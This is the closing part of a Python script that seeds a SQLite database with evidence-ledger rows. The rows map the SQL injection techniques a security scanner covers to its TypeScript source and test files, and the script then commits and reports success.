        ("EV_M07", "M07", "MECHANISM", "REF_PORTSWIGGER_SQLI", "src/services/sqlScanner/pipeline/stages/SecondOrderStage.ts", "src/services/sqlScanner/PortSwiggerLabArchetypes.test.ts", "Lab 14: Second-order SQL injection", 0, now, "VERIFIED_MOCK"),
        ("EV_M08", "M08", "MECHANISM", "REF_PORTSWIGGER_SQLI", "src/services/sqlScanner/OobManager.ts", "src/services/sqlScanner/PortSwiggerLabArchetypes.test.ts", "Lab 11: Blind SQL injection with out-of-band interaction", 0, now, "VERIFIED_MOCK"),
        ("EV_M09", "M09", "MECHANISM", "REF_RIGGER_2020", "src/services/sqlScanner/engine/TernaryMetamorphicVerifier.ts", "src/services/sqlScanner/ComprehensiveSqlArchetypeBenchmark.test.ts", "USENIX 2020 TLP Metamorphic Invariant Partitioning", 0, now, "VERIFIED_MOCK"),
        ("EV_M10", "M10", "MECHANISM", None, "src/services/sqlScanner/BooleanTester.ts", "src/services/sqlScanner/SqlScannerRegression.test.ts", "JSON/XML Operator Injection", 0, now, "VERIFIED_MOCK"),
        ("EV_M11", "M11", "MECHANISM", None, "src/services/sqlScanner/payloads/SqlPayloads.ts", "src/services/sqlScanner/SqlScannerRegression.test.ts", "Dynamic SQL & Procedure Escaping", 0, now, "VERIFIED_MOCK"),
        ("EV_M12", "M12", "MECHANISM", "REF_SHIFLETT_GBK", "src/services/sqlScanner/BypassEngine.ts", "src/services/sqlScanner/MetamorphicStudio.test.ts", "GBK Multibyte Backslash Smuggling", 0, now, "VERIFIED_MOCK"),
        ("EV_M13", "M13", "MECHANISM", None, "src/services/sqlScanner/payloads/SqlPayloads.ts", "src/services/sqlScanner/SentinelV7MaximumCoverageBenchmark.test.ts", "Database OS File System Bridge (Gated)", 0, now, "CATALOGUED_ONLY"),
        ("EV_M14", "M14", "MECHANISM", None, "src/services/sqlScanner/taxonomy/TaxonomyCatalog.ts", "src/services/sqlScanner/SentinelV7MaximumCoverageBenchmark.test.ts", "Database Link Lateral Pivot (No scanner code)", 0, now, "CATALOGUED_ONLY"),
        ("EV_M15", "M15", "MECHANISM", None, "src/services/sqlScanner/taxonomy/TaxonomyCatalog.ts", "src/services/sqlScanner/SentinelV7MaximumCoverageBenchmark.test.ts", "NewSQL Raft Consensus Anomalies (No scanner code)", 0, now, "CATALOGUED_ONLY"),
        ("EV_M16", "M16", "MECHANISM", "REF_PGVECTOR_SPEC", "src/services/sqlScanner/BooleanTester.ts", "src/services/sqlScanner/SentinelV7ExhaustiveCoverage.test.ts", "Vector Distance Operator Invariant Fuzzing", 0, now, "VERIFIED_MOCK"),
        ("EV_M17", "M17", "MECHANISM", None, "src/services/sqlScanner/engine/DialectMatrix.ts", "src/services/sqlScanner/SentinelV7MaximumCoverageBenchmark.test.ts", "Cloud Warehouse MPP Heavy-Calculation Delay", 0, now, "VERIFIED_MOCK"),
        ("EV_M18", "M18", "MECHANISM", "REF_HIBERNATE_HQL", "src/services/sqlScanner/engine/OrmRemediationEngine.ts", "src/services/sqlScanner/OrmRemediationEngine.test.ts", "ORM AST & Raw Query Boundary Escapes", 0, now, "VERIFIED_MOCK"),
        ("EV_DBMS_PG", "ENG_POSTGRES", "DBMS", None, "src/services/sqlScanner/engine/DialectMatrix.ts", "src/services/sqlScanner/SentinelV7MaximumCoverageBenchmark.test.ts", "PostgreSQL Native Capabilities", 0, now, "VERIFIED_MOCK"),
        ("EV_DBMS_MYSQL", "ENG_MYSQL", "DBMS", None, "src/services/sqlScanner/engine/DialectMatrix.ts", "src/services/sqlScanner/SentinelV7MaximumCoverageBenchmark.test.ts", "MySQL Native Capabilities", 0, now, "VERIFIED_MOCK"),
        ("EV_DBMS_MSSQL", "ENG_MSSQL", "DBMS", None, "src/services/sqlScanner/engine/DialectMatrix.ts", "src/services/sqlScanner/SentinelV7MaximumCoverageBenchmark.test.ts", "MSSQL Native Capabilities", 0, now, "VERIFIED_MOCK"),
        ("EV_DBMS_ORACLE", "ENG_ORACLE", "DBMS", None, "src/services/sqlScanner/engine/DialectMatrix.ts", "src/services/sqlScanner/SentinelV7MaximumCoverageBenchmark.test.ts", "Oracle Native Capabilities", 0, now, "VERIFIED_MOCK"),
        ("EV_DBMS_SQLITE", "ENG_SQLITE", "DBMS", None, "src/services/sqlScanner/engine/DialectMatrix.ts", "src/services/sqlScanner/SentinelV7MaximumCoverageBenchmark.test.ts", "SQLite Native Capabilities", 0, now, "VERIFIED_MOCK"),
    ]
    cur.executemany("INSERT INTO evidence_ledger VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)", evidence_entries)

    # Commit all seed data
    conn.commit()
    conn.close()
    print(f"[+] Intelligence Database created successfully at {DB_PATH}")

if __name__ == "__main__":
    init_database()

